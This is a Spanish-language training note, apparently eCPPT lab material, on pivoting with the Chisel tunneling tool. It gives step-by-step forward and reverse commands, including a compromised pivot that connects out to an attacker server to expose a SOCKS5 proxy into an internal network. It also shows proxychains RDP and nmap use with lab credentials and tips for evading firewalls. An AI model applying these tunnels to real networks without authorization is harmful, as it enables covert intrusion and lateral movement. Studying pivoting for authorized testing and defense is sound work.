
## 🧠 Concepto clave

Chisel es una herramienta de tunneling TCP/UDP escrita en Go que transporta datos encapsulados en HTTP y asegurados con SSH. Su principal ventaja frente a otras herramientas de pivoting es que combina en un solo binario un **proxy SOCKS5 completo** con transporte HTTP — lo que permite atravesar firewalls que bloquean TCP arbitrario pero permiten tráfico web, y da acceso a redes enteras en lugar de ports específicos.

Chisel opera en dos modos según quién levanta el servidor:

| Modo | Servidor en | Cliente en | Cuándo usarlo |
|---|---|---|---|
| **Forward** | Pivot comprometido | Atacante | El firewall permite conexiones entrantes al pivot |
| **Reverse** | Atacante | Pivot comprometido | El firewall bloquea entrantes al pivot pero permite salientes |

> [!info] **chisel** 📄 [github.com/jpillora/chisel](https://github.com/jpillora/chisel)
> Herramienta de tunneling TCP/UDP sobre HTTP con transporte cifrado via SSH. Escrita en Go — se compila en un único binario estático sin dependencias externas, lo que facilita enormemente su transferencia a pivots. El mismo binario actúa como servidor (`chisel server`) o como cliente (`chisel client`) según el subcomando. Soporta SOCKS5 nativo, port forwarding directo, tunneling UDP, autenticación con `--auth`, y cifrado TLS con `--tls-*`. Al usar WebSocket sobre HTTP como transporte, el tráfico es prácticamente indistinguible de tráfico web legítimo para firewalls sin inspección profunda.

---

## 📌 Instalación y compilación

> [!tip] Clonar el repositorio y compilar el binario de chisel
> ```bash
> git clone https://github.com/jpillora/chisel.git
> cd chisel
> go build
> ```
>
> `git clone` — Descarga el código fuente completo de chisel desde GitHub.
> `cd chisel` — Entra al directorio del proyecto donde está el código Go.
> `go build` — Compila el proyecto Go y genera el binario `chisel` en el directorio actual. Requiere Go instalado en el sistema (`sudo apt install golang`). El binario resultante es completamente estático y no necesita dependencias externas en el sistema destino.

> [!important] El binario compilado por defecto puede tener un tamaño considerable (~8-11MB). Para reducirlo antes de transferirlo al pivot: `go build -ldflags="-s -w"` elimina información de debug y reduce el tamaño significativamente. Alternativamente, usar binarios precompilados de la sección **Releases** del repositorio de GitHub, donde están disponibles para múltiples arquitecturas (linux/amd64, linux/arm, windows/amd64, etc.) sin necesidad de compilar.

> [!tip] Transferir el binario chisel al pivot host
> ```bash
> scp chisel ubuntu@10.129.202.64:~/
> ```
>
> `scp chisel` — Copia el binario compilado al directorio home del usuario en el pivot.
> `ubuntu@10.129.202.64:~/` — Usuario y dirección del pivot host. El binario quedará en `/home/ubuntu/chisel`.

---

## 📌 Modo Forward — Servidor en el pivot

En este modo el **servidor chisel corre en el pivot comprometido** y el cliente corre en el atacante. El atacante conecta activamente al pivot. Requiere que el puerto elegido del pivot sea accesible desde el atacante.
```
[Atacante]                          [Pivot Ubuntu 10.129.202.64]       [Red interna]
chisel client                       chisel server
  → conecta a 10.129.202.64:1234      escucha :1234                →   172.16.5.0/23
SOCKS5 proxy local :1080
```

### Paso 1 — Iniciar el servidor chisel en el pivot

> [!tip] Lanzar el servidor chisel en el pivot con soporte SOCKS5
> ```bash
> # En el pivot Ubuntu
> ./chisel server -v -p 1234 --socks5
> ```
>
> `server` — Modo servidor: espera conexiones entrantes de clientes chisel.
> `-v` — **Verbose**: muestra logs detallados de conexiones, handshakes y estado del túnel. Útil para verificar que el cliente conecta correctamente.
> `-p 1234` — Puerto donde el servidor chisel escuchará las conexiones WebSocket entrantes del cliente.
> `--socks5` — Habilita el proxy **SOCKS5** en el servidor. Sin esta flag chisel solo acepta port forwards explícitos — con ella acepta también conexiones SOCKS5 que permiten enrutar tráfico arbitrario a toda la red interna.

El servidor confirma que está listo:
```
server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
server: Listening on http://0.0.0.0:1234
```

### Paso 2 — Conectar el cliente chisel desde el atacante

> [!tip] Conectar el cliente chisel al servidor del pivot
> ```bash
> # En el atacante
> ./chisel client -v 10.129.202.64:1234 socks
> ```
>
> `client` — Modo cliente: conecta al servidor chisel especificado.
> `-v` — Verbose: muestra el proceso de handshake y estado de la conexión.
> `10.129.202.64:1234` — IP y puerto del servidor chisel en el pivot.
> `socks` — **Tunnel specification**: crea un proxy SOCKS5 local en el atacante. Sin prefijo `R` es forward — el proxy SOCKS5 se crea en el cliente (atacante) en el puerto por defecto `1080`. Todo el tráfico enviado al proxy `127.0.0.1:1080` saldrá por el pivot hacia la red interna.

El cliente confirma la conexión establecida:
```
client: Connecting to ws://10.129.202.64:1234
client: tun: proxy#127.0.0.1:1080=>socks: Listening
client: Connected (Latency 120.170822ms)
client: tun: SSH connected
```

El proxy SOCKS5 queda activo en `127.0.0.1:1080` del atacante.

---

## 📌 Configurar proxychains

> [!tip] Configurar proxychains para usar el SOCKS5 de chisel en el puerto 1080
> ```bash
> # Verificar la configuración actual
> tail -f /etc/proxychains.conf
>
> # La última línea del [ProxyList] debe ser:
> # socks5 127.0.0.1 1080
>
> # Si no está, añadirla:
> echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
> ```
>
> `socks5` — Chisel crea un proxy SOCKS **versión 5** — más moderno que SOCKS4, soporta UDP y autenticación. Es importante especificar `socks5` y no `socks4` para aprovechar todas las capacidades.
> `127.0.0.1 1080` — El proxy SOCKS5 de chisel escucha localmente en el atacante en el puerto `1080` — el puerto por defecto del cliente chisel cuando se usa `socks` sin especificar puerto explícito.

---

## 📌 Usar el proxy para acceder a la red interna

> [!tip] Conectar al Domain Controller interno por RDP a través del túnel chisel
> ```bash
> proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
> ```
>
> `proxychains` — Intercepta las conexiones de `xfreerdp` y las redirige al proxy SOCKS5 de chisel en `127.0.0.1:1080` → túnel WebSocket/HTTP → pivot Ubuntu → red interna `172.16.5.0/23`.
> `/v:172.16.5.19` — IP del Domain Controller en la red interna — directamente, sin port forwards intermedios. Chisel con SOCKS5 permite usar IPs de la red interna directamente.
> `/u:victor /p:pass@123` — Credenciales del usuario en el DC.

> [!tip] Escanear la red interna con nmap a través del proxy chisel
> ```bash
> proxychains nmap -v -Pn -sT -p22,80,443,445,3389 172.16.5.19
> ```
>
> `-Pn` — Sin ping ICMP previo — ICMP no funciona a través de proxychains.
> `-sT` — TCP Connect Scan — obligatorio con proxychains, que no soporta SYN scans parciales.

---

## 📌 Modo Reverse — Servidor en el atacante

Cuando el firewall del pivot bloquea conexiones entrantes (no se puede conectar del atacante al pivot), se invierte el modelo: el **servidor chisel corre en el atacante** y el **cliente corre en el pivot** y conecta hacia fuera. El tráfico de la red interna fluye de vuelta a través de esa conexión saliente.
```
[Atacante 10.10.14.17]              [Pivot Ubuntu]                [Red interna]
chisel server --reverse             chisel client
  escucha :1234               ←──   → conecta a 10.10.14.17:1234   →  172.16.5.0/23
SOCKS5 proxy local :1080
```

### Paso 1 — Iniciar el servidor chisel en el ATACANTE

> [!tip] Lanzar el servidor chisel en modo reverse en el atacante
> ```bash
> # En el atacante
> sudo ./chisel server --reverse -v -p 1234 --socks5
> ```
>
> `--reverse` — **Habilita el modo reverse**: permite que los clientes abran puertos y proxies en el servidor (atacante) en lugar de solo en ellos mismos. Sin esta flag, los clientes no pueden usar el prefijo `R:` en sus tunnel specifications.
> `-v` — Verbose.
> `-p 1234` — Puerto donde el servidor escucha las conexiones entrantes del cliente pivot.
> `--socks5` — Habilita SOCKS5 para las conexiones reverse.

El servidor confirma el modo reverse activo:
```
server: Reverse tunnelling enabled
server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
server: Listening on http://0.0.0.0:1234
```

### Paso 2 — Conectar el cliente chisel desde el PIVOT

> [!tip] Conectar el cliente chisel del pivot al servidor del atacante en modo reverse
> ```bash
> # En el pivot Ubuntu
> ./chisel client -v 10.10.14.17:1234 R:socks
> ```
>
> `10.10.14.17:1234` — IP y puerto del servidor chisel en el **atacante**. El pivot inicia la conexión hacia fuera — tráfico saliente que los firewalls corporativos normalmente permiten.
> `R:socks` — Tunnel specification con prefijo **`R`** (Reverse): indica que el proxy SOCKS5 debe crearse en el **servidor** (atacante), no en el cliente (pivot). El puerto por defecto del proxy SOCKS5 reverse es `1080` en el atacante. Para especificar un puerto diferente: `R:9050:socks`.

El cliente confirma la conexión:
```
client: Connecting to ws://10.10.14.17:1234
client: Connected (Latency 117.204196ms)
client: tun: SSH connected
```

El proxy SOCKS5 queda activo en `127.0.0.1:1080` del **atacante** — mismo resultado que en modo forward, pero la conexión de control la inició el pivot.

### Paso 3 — Verificar proxychains y usar el proxy

La configuración de proxychains es idéntica al modo forward:
```bash
# /etc/proxychains.conf — última línea del [ProxyList]:
socks5 127.0.0.1 1080
```

> [!tip] Conectar al DC interno en modo reverse exactamente igual que en forward
> ```bash
> proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
> ```

---

## 📌 Comparativa Forward vs Reverse

| Criterio | Forward | Reverse |
|---|---|---|
| Servidor chisel en | Pivot comprometido | Atacante |
| Cliente chisel en | Atacante | Pivot comprometido |
| Quién inicia la conexión | Atacante → Pivot | Pivot → Atacante |
| Requiere puerto abierto en | Pivot (entrante) | Atacante (entrante) |
| Útil cuando | Firewall permite entrantes al pivot | Firewall bloquea entrantes al pivot |
| Proxy SOCKS5 queda en | Atacante (`127.0.0.1:1080`) | Atacante (`127.0.0.1:1080`) |
| Resultado para proxychains | Idéntico | Idéntico |

El resultado final para el atacante es exactamente el mismo en ambos modos: un proxy SOCKS5 en `127.0.0.1:1080` que da acceso a la red interna. La diferencia es únicamente en la **dirección de la conexión de control** — detalle crítico para evadir firewalls con reglas de ingress estrictas.

---

## 🔗 Relaciones / Contexto

Chisel es la herramienta de pivoting más completa y versátil del toolkit ofensivo moderno para escenarios sin SSH. El modo reverse es especialmente relevante en el eCPPT y en engagements reales porque los entornos corporativos típicamente tienen firewalls que bloquean conexiones entrantes hacia hosts internos comprometidos pero permiten conexiones salientes hacia Internet — exactamente el escenario que el modo reverse resuelve. La combinación chisel reverse + proxychains cubre prácticamente cualquier escenario de pivoting de un solo salto, y encadenando múltiples instancias de chisel se pueden cubrir pivots de múltiples saltos a través de redes completamente segmentadas.